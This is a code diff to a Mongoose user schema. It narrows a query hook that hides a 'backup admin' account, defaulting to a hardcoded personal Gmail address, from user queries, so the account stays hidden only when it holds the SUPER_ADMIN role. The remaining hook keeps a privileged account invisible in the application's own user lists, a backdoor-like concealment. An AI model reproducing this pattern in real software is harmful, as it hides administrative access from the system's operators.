@@ -124,7 +124,8 @@ userSchema.pre('save', async function () {
   }
 });
 
-// Exclude the backup admin user from all queries unless specifically querying for it (e.g. login/auth check)
+// Exclude the backup admin user from queries ONLY when querying for SUPER_ADMIN or general user lists where they act as SUPER_ADMIN.
+// Never exclude users during invitation token validation, password reset, or when they are invited as an employee/manager/client.
 userSchema.pre(/^find|count|countDocuments|estimatedDocumentCount|distinct/, function () {
   const backupAdminEmail = (process.env.BACKUP_ADMIN_EMAIL || 'shaikrehman78609@gmail.com').toLowerCase();
   const filter = this.getFilter();
@@ -138,11 +139,42 @@ userSchema.pre(/^find|count|countDocuments|estimatedDocumentCount|distinct/, fun
     if (filter._id && (typeof filter._id === 'string' || mongoose.Types.ObjectId.isValid(filter._id))) {
       return;
     }
+    // 3. Lookup by invitation or password reset tokens
+    if (
+      filter.invitationToken !== undefined ||
+      filter.resetPasswordToken !== undefined ||
+      filter.usedInvitationTokens !== undefined ||
+      filter.revokedInvitationTokens !== undefined
+    ) {
+      return;
+    }
+    // 4. Any $or query that inspects token fields or identity
+    if (Array.isArray(filter.$or)) {
+      const isTokenOrIdentityQuery = filter.$or.some(c => 
+        c && (
+          c.invitationToken !== undefined ||
+          c.usedInvitationTokens !== undefined ||
+          c.revokedInvitationTokens !== undefined ||
+          c.resetPasswordToken !== undefined ||
+          c.email !== undefined ||
+          c._id !== undefined
+        )
+      );
+      if (isTokenOrIdentityQuery) {
+        return;
+      }
+    }
   }
 
-  // Otherwise, hide the backup admin email from queries
-  this.where({ email: { $ne: backupAdminEmail } });
+  // Hide backup admin only if they are acting as SUPER_ADMIN. Never hide employees, managers, or invited staff.
+  this.where({
+    $or: [
+      { email: { $ne: backupAdminEmail } },
+      { role: { $ne: 'SUPER_ADMIN' } }
+    ]
+  });
 });
+
 
 // Instance method to compare passwords
 userSchema.methods.matchPassword = async function (enteredPassword) {
